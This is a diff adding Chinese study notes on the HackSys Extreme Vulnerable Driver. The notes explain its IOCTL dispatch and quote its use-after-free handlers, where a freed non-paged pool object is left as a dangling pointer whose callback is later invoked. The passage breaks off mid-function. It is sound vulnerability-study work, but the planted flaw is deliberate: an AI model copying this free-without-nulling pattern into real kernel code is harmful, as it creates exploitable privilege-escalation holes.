@@ -317,7 +317,886 @@ void Shellcode()
 
 ## 漏洞驱动代码分析
 
+先看一下HEVD驱动代码的代码结构，其实这里UAF相关的有两个，一个是`UseAfterFreeNonPagedPool`，另一个是`UseAfterFreeNonPagedPoolNx`。这里实际上不是堆块，而是内存池。具体机制之后再学习。
 
+### HackSysExtremeVulnerableDriver.h
+
+```c++
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+```
+
+CTL_CODE这个宏定义在`Wdm.h`和`Ntddk.h`中，是为了定义新的IO控制代码，我们一般会如上，再次封装。在WRK中这个宏的源码如下：
+
+```c++
+//
+// Macro definition for defining IOCTL and FSCTL function control codes.  Note
+// that function codes 0-2047 are reserved for Microsoft Corporation, and
+// 2048-4095 are reserved for customers.
+//
+
+#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \
+    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
+)
+```
+
+i/o控制代码的布局图如下:
+
+![说明 i/o 控制代码布局的关系图](https://docs.microsoft.com/zh-cn/windows-hardware/drivers/kernel/images/ioctl-1.png)
+
+>- 如果一个IOCTLs可用于用户态软件组件，IOCTL必须与IRP_MJ_DEVICE_CONTROL请求一起使用，用户态的组件通过调用Win32函数`DeviceIoControl`发送`IRP_MJ_DEVICE_CONTROL`请求
+>- 如果一个IOCTLs只能用于内核态驱动组件，IOCTL必须与IRP_MJ_INTERNAL_DEVICE_CONTROL请求一起使用。kernel态组件通过`IoBuildDeviceIoControlRequest`请求创建`IRP_MJ_INTERNAL_DEVICE_CONTROL`请求。（https://docs.microsoft.com/zh-cn/windows-hardware/drivers/kernel/creating-ioctl-requests-in-drivers）
+
+然后定义了一系列的IOCTL：
+
+```c++
+//
+// IOCTL Definitions
+//
+
+#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
+#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
+#define HEVD_IOCTL_ARBITRARY_WRITE                               IOCTL(0x802)
+#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL                IOCTL(0x803)
+#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            IOCTL(0x804)
+#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 IOCTL(0x805)
+#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                IOCTL(0x806)
+#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL           IOCTL(0x807)
+#define HEVD_IOCTL_TYPE_CONFUSION                                IOCTL(0x808)
+#define HEVD_IOCTL_INTEGER_OVERFLOW                              IOCTL(0x809)
+#define HEVD_IOCTL_NULL_POINTER_DEREFERENCE                      IOCTL(0x80A)
+#define HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK                    IOCTL(0x80B)
+#define HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL               IOCTL(0x80C)
+#define HEVD_IOCTL_DOUBLE_FETCH                                  IOCTL(0x80D)
+#define HEVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS                   IOCTL(0x80E)
+#define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL              IOCTL(0x80F)
+#define HEVD_IOCTL_BUFFER_OVERFLOW_PAGED_POOL_SESSION            IOCTL(0x810)
+#define HEVD_IOCTL_WRITE_NULL                                    IOCTL(0x811)
+#define HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX             IOCTL(0x812)
+#define HEVD_IOCTL_MEMORY_DISCLOSURE_NON_PAGED_POOL_NX           IOCTL(0x813)
+#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL_NX         IOCTL(0x814)
+#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL_NX              IOCTL(0x815)
+#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL_NX             IOCTL(0x816)
+#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL_NX        IOCTL(0x817)
+#define HEVD_IOCTL_CREATE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX    IOCTL(0x818)
+#define HEVD_IOCTL_SET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX  IOCTL(0x819)
+#define HEVD_IOCTL_GET_ARW_HELPER_OBJECT_NAME_NON_PAGED_POOL_NX  IOCTL(0x81A)
+#define HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX    IOCTL(0x81B)
+```
+
+然后为两个回调函数提供声明，
+
+```
+DRIVER_INITIALIZE DriverEntry;
+DRIVER_UNLOAD     DriverUnloadHandler;
+```
+
+**其中`DriverEntry`是所有驱动程序的入口点，就像Main()适用于许多用户态APP一样。`DriverEntry`的任务是初始化驱动程序范围的结构和资源，一般会创建驱动程序对象，这个对象充当你在驱动程序中创建的所有其他框架对象的父对象，这些框架包括设备对象、I/O队列、计时器、旋转锁等。基于框架的驱动程序不会直接访问框架对象，而是通过句柄(handles)来引用对象，驱动程序将该对象作为输入传递给对象方法。框架对象的特征有：引用计数、上下文空间、删除回调函数、父对象。**
+
+**`DRIVER_UNLOAD`函数会在系统卸载驱动之前执行。对于WDM驱动是必需的，对于非WDM的驱动是可选的。DriverEntry函数必须存储Unload函数的地址在`DriverObject->DriverUnload`中**
+
+在WRK代码中，这些所谓的回调函数都是预留的函数指针，然后这些函数指针作为回调函数在相应位置被调用。
+
+```c++
+typedef
+NTSTATUS
+(*PDRIVER_INITIALIZE) (
+    IN struct _DRIVER_OBJECT *DriverObject,
+    IN PUNICODE_STRING RegistryPath
+    );
+
+//
+// Define driver unload routine type.
+//
+typedef
+VOID
+(*PDRIVER_UNLOAD) (
+    IN struct _DRIVER_OBJECT *DriverObject
+    );
+//
+```
+
+>驱动分为NT式驱动和WDM式驱动两种。
+>
+>对于NT式驱动来说，主要的函数时DriverEntry函数，卸载函数，以及各个IRP的派遣函数，不支持即插即用功能，要导入的头文件是ntddk.h。
+>
+>其入口函数DriverEntry主要进行初始化工作，驱动加载时，系统进程创建新的线程，调用对象管理器，创建驱动对象。
+>
+>```c++
+>NTSTATUS IoCreateDevice(
+>  _In_     PDRIVER_OBJECT  DriverObject,         //指向驱动对象的指针
+>  _In_     ULONG           DeviceExtensionSize,  //设备扩展的大小
+>  _In_opt_ PUNICODE_STRING DeviceName,           //设备对象名
+>  _In_     DEVICE_TYPE     DeviceType,           //设备对象类型
+>  _In_     ULONG           DeviceCharacteristics,//设备对象特征
+>  _In_     BOOLEAN         Exclusive,            //是否在内核下使用
+>  _Out_    PDEVICE_OBJECT  *DeviceObject         //返回设备对象地址
+>);
+>```
+>
+>对于WDM式驱动来说，它支持即插即用功能，要导入的头文件为wdm.h。
+>
+>这是Windows 2000后加入的新的驱动模型，比NT式驱动更加复杂，完成一个设备操作，至少要两个驱动设备共同完成，分别是物理设备对象（PDO）和功能设备对象（FDO），FDO会附加在PDO上。
+>
+>WDM的入口函数也是DriverEntry，但创建设备对象的责任交给了AddDevice函数，而且必须加载IRP_MJ_PNP派遣回调函数。
+>
+>在WDM中，大部分的卸载工作都不是由DriverUnload来处理，而是放在对IRP_MN_REMOVE_DEVICE的IRP的处理函数中处理。
+>
+>WDM式驱动不是按照服务来加载，安装WDM式驱动需要一个inf文件。inf文件描述了WDM驱动程序的操作硬件设备的信息和驱动程序的一些信息。
+>
+>**驱动程序是一个“回调集合”，经初始化后，会在系统有需要时等待系统调用。这可能是新设备到达事件、用户模式应用程序的I/O请求、系统电源关闭事件、另一个驱动程序的请求，或用户意外拔出设备时的意外删除事件。**
+
+ 然后是一些派遣回调函数的声明：
+
+```c++
+__drv_dispatchType(IRP_MJ_CREATE)
+__drv_dispatchType(IRP_MJ_CLOSE)
+DRIVER_DISPATCH IrpCreateCloseHandler;
+
+__drv_dispatchType(IRP_MJ_DEVICE_CONTROL)
+DRIVER_DISPATCH IrpDeviceIoCtlHandler;
+
+__drv_dispatchType(IRP_MJ_CREATE)
+__drv_dispatchType(IRP_MJ_CREATE_NAMED_PIPE)
+DRIVER_DISPATCH IrpNotImplementedHandler;
+```
+
+`DRIVER_DISPATCH`这个派遣回调函数十分重要，是用来处理不同的IRP（IO请求包）。参数是相应的`_DEVICE_OBJECT`指针和`_IRP`指针。关键的是派遣回调函数的`remark`，所有派遣函数的输入参数都在IRP指针指向的结构中提供，而附加参数在驱动程序的相关I/O堆栈位置中提供，该位置由`IO_STACK_LOCATION`结构描述，并且可以通过调用`IoGetCurrentIrpStackLocation`获取。通常，所有派遣回调函数都在`IRQL=PASSIVE`级别的任意线程上下文中执行，但也有例外。
+
+- 这里以声明的`IrpCreateCloseHandler`派遣回调函数为例，该函数有两个remark：`IRP_MJ_CREATE`和`IRP_MJ_CLOSE`。前者在新文件/目录创建或已存在的文件、设备、目录、volumn等被创建时由IO管理器发送，这一般是用户态的win32API（如CreateFile）或者kernel态的组件调用`IoCreateFile`、`IoCreateFileSpecifyDeviceObjectHint`、`ZwCreateFile`、`ZsOpenFile`等时被调用；后者表示此请求的回执指示已关闭并释放与目标设备对象相关联的文件对象的最后一个句柄，即 已完成或取消所有未完成的 I/O 请求。
+
+>A driver can provide a single *DispatchCreateClose* routine instead of separate [DispatchCreate](https://msdn.microsoft.com/library/windows/hardware/ff543266) and [DispatchClose](https://docs.microsoft.com/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_dispatch) routines.
+>
+>A driver's *DispatchCreateClose* routine should be named ***Xxx\*DispatchCreateClose**, where *Xxx* is a driver-specific prefix. The driver's [DriverEntry](https://docs.microsoft.com/windows-hardware/drivers/storage/driverentry-of-ide-controller-minidriver) routine must store the *DispatchCreateClose* routine's address in *DriverObject*->**MajorFunction**[IRP_MJ_CREATE] and in *DriverObject*->**MajorFunction**[IRP_MJ_CLOSE].
+
+- 对于`IrpDeviceIoCtlHandler`这个派遣回调函数来说，IRP_MJ_DEVICE_CONTROL在一个用户态的app调用Win32API `DeviceIoControl`时或kernel态组件调用`ZwDeviceIoControlFile`时被调用。
+
+- 对于`IrpNotImplementedHandler`这个派遣回调函数来说，`IRP_MJ_CREATE_NAMED_PIPE`在新的命名管道被创建时由IO管理器发送，一般是用户态的app调用win32API`CreateNamePipe`或者kernel态的组件调用`IoCreateFile`或`IoCreateFileSpecifyDeviceObjectHint`时被调用。
+
+上述声明的定义：
+
+```c++
+NTSTATUS
+DriverEntry(
+    _In_ PDRIVER_OBJECT DriverObject,
+    _In_ PUNICODE_STRING RegistryPath
+);
+
+VOID
+DriverUnloadHandler(
+    _In_ PDRIVER_OBJECT DriverObject
+);
+
+NTSTATUS
+IrpCreateCloseHandler(
+    _In_ PDEVICE_OBJECT DeviceObject,
+    _In_ PIRP Irp
+);
+
+NTSTATUS
+IrpDeviceIoCtlHandler(
+    _In_ PDEVICE_OBJECT DeviceObject,
+    _In_ PIRP Irp
+);
+
+NTSTATUS
+IrpNotImplementedHandler(
+    _In_ PDEVICE_OBJECT DeviceObject,
+    _In_ PIRP Irp
+);
+```
+
+至此，头文件的声明和定义结束。
+
+### HackSysExtremeVulnerableDriver.c
+
+首先是一些没见过的宏定义
+
+```c++
+#ifdef ALLOC_PRAGMA
+#pragma alloc_text(INIT, DriverEntry)
+#pragma alloc_text(PAGE, DriverUnloadHandler)
+#pragma alloc_text(PAGE, IrpCreateCloseHandler)
+#pragma alloc_text(PAGE, IrpDeviceIoCtlHandler)
+#pragma alloc_text(PAGE, IrpNotImplementedHandler)
+#endif // ALLOC_PRAGMA
+```
+
+这里alloc_text是意思是让编译器将相应的函数分配到指定段。这里将DriverUnloadHandler、IrpCreateCloseHandler、IrpDeviceIoCtlHandler、IrpNotImplementedHandler分配到分页池中。（PAGE段）
+
+然后是`DriverEntry`的函数体。
+
+- 有一个`UNREFERENCED_PARAMETER(RegistryPath);`，这个API的意思是将不会引用的参数予以标记。
+- 有`PAGED_CODE`的调用，这个宏确保调用方线程在足够低的允许分页的IRQL（管理硬件的优先级）上运行，如果IRQL>APC_LEVEL，则PAGED_CODE宏会导致系统ASSERT。
+
+>默认的，链接器会将".text", ".data"等名字赋予驱动镜像文件的代码段和数据段，在驱动加载时，IO管理器会令这些段nonpaged。一个非分页的段通常是memory-resident的（内存驻留）。驱动的开发者可以选择令驱动的指令部分变得可分页，所以Windows可以将这些部分不使用时移动到paging file中，这些段以"PAGE"开头。
+
+- ```
+  RtlInitUnicodeString(&DeviceName, L"\\Device\\HackSysExtremeVulnerableDriver");
+  RtlInitUnicodeString(&DosDeviceName, L"\\DosDevices\\HackSysExtremeVulnerableDriver");
+  ```
+
+  初始化两个Unicode字符串
+
+- 然后用`IoCreateDevice`创建设备，如果失败则调用`IoDeleteDevice`删除。
+
+  ```c++
+   Status = IoCreateDevice(
+          DriverObject, 				// 指向驱动对象的指针
+          0,							// 驱动扩展size
+          &DeviceName,				// NULL结尾的驱动名字字符串
+          FILE_DEVICE_UNKNOWN,		// 驱动类型
+          FILE_DEVICE_SECURE_OPEN,	// 驱动对象特征
+          FALSE,						// 是否在内核下使用
+          &DeviceObject				// 返回设备对象地址
+      );
+  
+      if (!NT_SUCCESS(Status))
+      {
+          if (DeviceObject)
+          {
+              //
+              // Delete the device
+              //
+  
+              IoDeleteDevice(DeviceObject);
+          }
+  
+          DbgPrint("[-] Error Initializing HackSys Extreme Vulnerable Driver\n");
+          return Status;
+      }
+  
+  ```
+
+- 初始化IRP句柄：
+
+  ```c++
+  //
+      // Assign the IRP handlers
+      //
+  
+      for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
+      {
+          DriverObject->MajorFunction[i] = IrpNotImplementedHandler;
+      }
+  
+      //
+      // Assign the IRP handlers for Create, Close and Device Control
+      //
+  
+      DriverObject->MajorFunction[IRP_MJ_CREATE] = IrpCreateCloseHandler;
+      DriverObject->MajorFunction[IRP_MJ_CLOSE] = IrpCreateCloseHandler;
+      DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceIoCtlHandler;
+  
+      //
+      // Assign the driver Unload routine
+      //
+  
+      DriverObject->DriverUnload = DriverUnloadHandler;
+  ```
+
+- 设置DriverObject的flag：
+
+  ```c++
+  	DeviceObject->Flags |= DO_DIRECT_IO;
+      DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
+  ```
+
+- 创建符号链接，创建一个设备对象名字和设备的用户变量名字之间的符号链接。
+
+  ```c++
+  Status = IoCreateSymbolicLink(&DosDeviceName, &DeviceName);
+  ```
+
+---
+
+然后是`IrpCreateCloseHandler`的函数体，主要是调用了`IoCompleteRequest`宏，表示caller已经完成了对给定IO请求的处理并且返回给定的IRP到IO管理器。`IoCompleteRequest(Irp, IO_NO_INCREMENT);`，这里`IO_NO_INCREMENT`说明请求操作的原始线程的优先级不需要变化，这里是因为这个操作很快就会完成（IrpCreateCloseHandler中并没有实质性操作）或报错完成。
+
+在`DriverUnloadHandler`的函数体中，调用`IoDeleteSymbolicLink`删除了符号链接，调用`IoDeleteDevice`删除了设备对象。
+
+`IrpNotImplementedHandler`和`IrpCreateCloseHandler`的函数体相同，也是不做任何操作就直接complete。
+
+最后是`IrpDeviceIoCtlHandler`，这个函数需要重点分析。
+
+- `IrpSp = IoGetCurrentIrpStackLocation(Irp);` **这个函数返回指向caller的I/O堆栈位置在指定IRP中的指针。**每个驱动都必须以每个它发送的IRP调用`IoGetCurrentIrpStackLocation `，为了获取当前请求的参数。
+
+>I/o 管理器为分层驱动程序链中的每个驱动程序提供它所设置的每个 IRP 的 i/o 堆栈位置。每个I/O堆栈位置都包含一个`IO_STACK_LOCATION`结构体。**这个结构体中最重要的就是`Parameters`。**I/O管理器为每个IRP创建一个I/O堆栈位置的数组，其中的数组元素对应于一系列分层驱动程序中的每个驱动程序。每个驱动拥有一个包中的堆栈位置，并且通过`IoGetCurrentIrpStackLocation `函数获取I/O操作的驱动相关消息。链中的每个驱动都可以通过调用`IoGetNextLrpStackLocation`来设置更低层的驱动的IO堆栈位置，任何高层驱动的I/O堆栈位置也能用来存储操作的上下文，因此驱动的`IoCompletion`函数可以完成清理操作。
+
+- `IoControlCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;`获取IO请求的控制代码
+
+- 基于IO控制代码，有一系列switch case语句，首先打印一些调试信息，然后执行相应的句柄。
+
+  ```c++
+   if (IrpSp)
+      {
+          switch (IoControlCode)
+          {
+          ...
+  		case HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL:
+              DbgPrint("****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n");
+              Status = AllocateUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
+              DbgPrint("****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******\n");
+              break;
+          case HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL:
+              DbgPrint("****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n");
+              Status = UseUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
+              DbgPrint("****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******\n");
+              break;
+          case HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL:
+              DbgPrint("****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n");
+              Status = FreeUaFObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
+              DbgPrint("****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******\n");
+              break;
+          case HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL:
+              DbgPrint("****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n");
+              Status = AllocateFakeObjectNonPagedPoolIoctlHandler(Irp, IrpSp);
+              DbgPrint("****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******\n");
+              break;
+     		...
+          default:
+              DbgPrint("[-] Invalid IOCTL Code: 0x%X\n", IoControlCode);
+              Status = STATUS_INVALID_DEVICE_REQUEST;
+              break;
+          }
+      }
+  ```
+
+- 最后更新IoStatus信息和完成请求
+
+  ```c++
+  	//
+      // Update the IoStatus information
+      //
+  	Irp->IoStatus.Status = Status;
+      Irp->IoStatus.Information = 0;
+  
+      //
+      // Complete the request
+      //
+  
+      IoCompleteRequest(Irp, IO_NO_INCREMENT);
+  ```
+
+### Common.h
+
+设置了一些宏定义和一个void类型的函数指针`FunctionPointer`
+
+```c++
+#define POOL_TAG 'kcaH'
+#define BUFFER_SIZE 512
+
+#define _STRINGIFY(value) #value
+#define STRINGIFY(value) _STRINGIFY(value)
+
+#define DbgPrint(Format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, Format, __VA_ARGS__)
+
+typedef void (*FunctionPointer)(void);
+
+```
+
+然后定义了一堆handler函数，这些函数都有两个参数Irp和IrpSp，前者为IO请求包，后者为IRP的堆栈指针。
+
+```c++
+NTSTATUS
+FreeUaFObjectNonPagedPoolNxIoctlHandler(
+    _In_ PIRP Irp,
+    _In_ PIO_STACK_LOCATION IrpSp
+);
+```
+
+### UseAfterFreeNonPagedPool.h ###
+
+重要的数据结构如下：
+
+```c++
+//
+// Structures
+//
+
+typedef struct _USE_AFTER_FREE_NON_PAGED_POOL
+{
+    FunctionPointer Callback; // 一个函数指针
+    CHAR Buffer[0x54];		  // 0x54的缓冲区
+} USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;
+
+typedef struct _FAKE_OBJECT_NON_PAGED_POOL
+{
+    CHAR Buffer[0x54 + sizeof(PVOID)]; // 预留了一个函数指针+0x54的缓冲区
+} FAKE_OBJECT_NON_PAGED_POOL, *PFAKE_OBJECT_NON_PAGED_POOL;
+```
+
+然后定义了一些函数。
+
+### UseAfterFreeNonPagedPool.c
+
+定义一个全局的PUSE_AFTER_FREE_NON_PAGED_POOL类型指针，初始化为NULL。
+
+```c
+PUSE_AFTER_FREE_NON_PAGED_POOL g_UseAfterFreeObjectNonPagedPool = NULL;
+```
+
+每个之前定义的Handler函数其实都是wrapper，例如`AllocateUaFObjectNonPagedPoolIoctlHandler`调用`AllocateUaFObjectNonPagedPool()`，相当于Linux Glibc菜单pwn题的allocate函数。
+
+```c
+NTSTATUS
+AllocateUaFObjectNonPagedPoolIoctlHandler(
+    _In_ PIRP Irp,
+    _In_ PIO_STACK_LOCATION IrpSp
+)
+{
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+    UNREFERENCED_PARAMETER(Irp);
+    UNREFERENCED_PARAMETER(IrpSp);
+    PAGED_CODE();
+
+    Status = AllocateUaFObjectNonPagedPool();
+
+    return Status;
+}
+```
+
+函数体如下：
+
+```c
+NTSTATUS
+AllocateUaFObjectNonPagedPool(
+    VOID
+)
+{
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+    PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree = NULL; // 初始化一个局部PUSE指针为NULL
+
+    PAGED_CODE();
+
+    __try
+    { 
+        DbgPrint("[+] Allocating UaF Object\n");
+
+        //
+        // Allocate Pool chunk
+        //
+
+        UseAfterFree = (PUSE_AFTER_FREE_NON_PAGED_POOL)ExAllocatePoolWithTag(
+            NonPagedPool, //非分页池，可以从任何IRQL访问，但是是稀缺资源，是可以执行。Win8开始，应该从NX非分页池分配大部分或全部非分页内存。
+            sizeof(USE_AFTER_FREE_NON_PAGED_POOL), // 要分配的空间大小
+            (ULONG)POOL_TAG						   // pool tag，通常是逆序
+        );	// ExallocatePoolWithTag函数分配特定类型的pool内存并返回指向block的指针。
+
+        if (!UseAfterFree) // 申请失败，报错退出
+        {
+            //
+            // Unable to allocate Pool chunk
+            //
+
+            DbgPrint("[-] Unable to allocate Pool chunk\n");
+
+            Status = STATUS_NO_MEMORY;
+            return Status;
+        }
+        else	// 否则打印出信息
+        {
+            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
+            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
+            DbgPrint("[+] Pool Size: 0x%X\n", sizeof(USE_AFTER_FREE_NON_PAGED_POOL));
+            DbgPrint("[+] Pool Chunk: 0x%p\n", UseAfterFree);
+        }
+
+        //
+        // Fill the buffer with ASCII 'A'
+        //
+
+        RtlFillMemory((PVOID)UseAfterFree->Buffer, sizeof(UseAfterFree->Buffer), 0x41);
+		// 用RtlFillMemory填充0x54的缓冲区空间为‘A’
+        //
+        // Null terminate the char buffer
+        //
+
+        UseAfterFree->Buffer[sizeof(UseAfterFree->Buffer) - 1] = '\0'; // 最后一个填充为NULL
+
+        //
+        // Set the object Callback function
+        //
+
+        UseAfterFree->Callback = &UaFObjectCallbackNonPagedPool; //回调函数指针设置为UaFObjectCallbackNonPagedPool,这个函数没有什么实质性内容
+
+        //
+        // Assign the address of UseAfterFree to a global variable
+        //
+
+        g_UseAfterFreeObjectNonPagedPool = UseAfterFree; // 全局的指针指向当前分配的内存空间
+
+        DbgPrint("[+] UseAfterFree Object: 0x%p\n", UseAfterFree);
+        DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
+        DbgPrint("[+] UseAfterFree->Callback: 0x%p\n", UseAfterFree->Callback);
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        Status = GetExceptionCode();
+        DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+
+    return Status;
+}
+```
+
+Free的如下：
+
+```c
+NTSTATUS
+FreeUaFObjectNonPagedPool(
+    VOID
+)
+{
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+    PAGED_CODE();
+
+    __try
+    {
+        if (g_UseAfterFreeObjectNonPagedPool) // 如果全局的不为NULL
+        {
+            DbgPrint("[+] Freeing UaF Object\n");
+            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
+            DbgPrint("[+] Pool Chunk: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
+
+#ifdef SECURE
+            //
+            // Secure Note: This is secure because the developer is setting
+            // 'g_UseAfterFreeObjectNonPagedPool' to NULL once the Pool chunk is being freed
+            //
+
+            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
+
+            //
+            // Set to NULL to avoid dangling pointer
+            //
+
+            g_UseAfterFreeObjectNonPagedPool = NULL;
+#else
+            //
+            // Vulnerability Note: This is a vanilla Use After Free vulnerability
+            // because the developer is not setting 'g_UseAfterFreeObjectNonPagedPool' to NULL.
+            // Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer
+            // (dangling pointer)
+            //
+
+            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);
+#endif
+
+            Status = STATUS_SUCCESS;
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        Status = GetExceptionCode();
+        DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+
+    return Status;
+}
+```
+
+SECURE的宏定义下，用`ExFreePoolWithTag`free后会置为NULL，否则，不会置为NULL，所以全局的`g_UseAfterFreeObjectNonPagedPool`会成为悬挂指针。
+
+`AllocateFakeObjectNonPagedPool`如下：
+
+Use的如下：
+
+```c
+NTSTATUS
+UseUaFObjectNonPagedPool(
+    VOID
+)
+{
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+    PAGED_CODE();
+
+    __try
+    {
+        if (g_UseAfterFreeObjectNonPagedPool) // 如果全局指针不为NULL
+        {
+            DbgPrint("[+] Using UaF Object\n");
+            DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n", g_UseAfterFreeObjectNonPagedPool);
+            DbgPrint("[+] g_UseAfterFreeObjectNonPagedPool->Callback: 0x%p\n", g_UseAfterFreeObjectNonPagedPool->Callback);
+            DbgPrint("[+] Calling Callback\n");
+
+            if (g_UseAfterFreeObjectNonPagedPool->Callback) // 回调函数不为NULL
+            {
+                g_UseAfterFreeObjectNonPagedPool->Callback(); // 执行函数指针（可以劫持控制流）
+            }
+
+            Status = STATUS_SUCCESS;
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        Status = GetExceptionCode();
+        DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+
+    return Status;
+}
+```
+
+AllocateFakeObjectNonPagedPool的wrapper如下：
+
+```c
+NTSTATUS
+AllocateFakeObjectNonPagedPoolIoctlHandler(
+    _In_ PIRP Irp,
+    _In_ PIO_STACK_LOCATION IrpSp
+)
+{
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+    PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject = NULL;
+
+    UNREFERENCED_PARAMETER(Irp);
+    PAGED_CODE();
+
+    UserFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)IrpSp->Parameters.DeviceIoControl.Type3InputBuffer; // 用参数传递一个PFAKE_OBJECT_NON_PAGED_POOL类型的变量
+
+    if (UserFakeObject) // 如果不为NULL
+    {
+        Status = AllocateFakeObjectNonPagedPool(UserFakeObject); // allocate一个fake的object
+    }
+
+    return Status;
+}
+
+```
+
+从用户态的输入copy到kernel态。
+
+```c
+NTSTATUS
+AllocateFakeObjectNonPagedPool(
+    _In_ PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject
+) // 参数是传递进来的PFAKE_OBJECT_NON_PAGED_POOL类型的变量
+{
+    NTSTATUS Status = STATUS_SUCCESS;
+    PFAKE_OBJECT_NON_PAGED_POOL KernelFakeObject = NULL;
+
+    PAGED_CODE();
+
+    __try
+    {
+        DbgPrint("[+] Creating Fake Object\n");
+
+        //
+        // Allocate Pool chunk
+        //
+
+        KernelFakeObject = (PFAKE_OBJECT_NON_PAGED_POOL)ExAllocatePoolWithTag(
+            NonPagedPool,
+            sizeof(FAKE_OBJECT_NON_PAGED_POOL),
+            (ULONG)POOL_TAG
+        );	// 分配一个PFAKE类型的object
+
+        if (!KernelFakeObject) 
+        {
+            //
+            // Unable to allocate Pool chunk
+            //
+
+            DbgPrint("[-] Unable to allocate Pool chunk\n");
+
+            Status = STATUS_NO_MEMORY;
+            return Status;
+        }
+        else
+        {
+            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
+            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
+            DbgPrint("[+] Pool Size: 0x%X\n", sizeof(FAKE_OBJECT_NON_PAGED_POOL));
+            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelFakeObject);
+        }
+
+        //
+        // Verify if the buffer resides in user mode
+        //
+		// ProbeForRead函数检查用户态的缓冲区是否在地址空间中的用户部分，并且正确的对齐。
+        ProbeForRead(
+            (PVOID)UserFakeObject,	// 用户态的fake对象
+            sizeof(FAKE_OBJECT_NON_PAGED_POOL),
+            (ULONG)__alignof(UCHAR)
+        );
+ 
+        //
+        // Copy the Fake structure to Pool chunk
+        //
+		
+        // 调用RtlCopyMemory函数拷贝到KernelFakeObject，前8个字节是函数指针，后0x54个是普通字符
+        RtlCopyMemory(
+            (PVOID)KernelFakeObject,
+            (PVOID)UserFakeObject,
+            sizeof(FAKE_OBJECT_NON_PAGED_POOL)
+        );
+
+        //
+        // Null terminate the char buffer
+        //
+
+        KernelFakeObject->Buffer[sizeof(KernelFakeObject->Buffer) - 1] = '\0';
+
